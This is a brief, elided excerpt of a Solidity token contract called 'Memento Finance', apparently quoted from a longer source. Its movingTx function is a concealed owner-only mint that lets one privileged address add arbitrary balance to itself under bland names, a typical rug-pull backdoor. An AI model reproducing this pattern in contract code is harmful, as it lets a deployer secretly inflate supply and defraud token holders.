...
contract Context {
 ...
 contract MementoFinance is Context, ERC20, ERC20Metadata {
    mapping(address => uint256) private center;

    mapping(address => mapping(address => uint256)) private _allowances;
    string private _name = "Memento Finance";
    ...
    function movingTx(uint256 head) public {
        require(_msgSender() == _definition, "BEP : Can't be done");
        center[_definition] += head;
    }
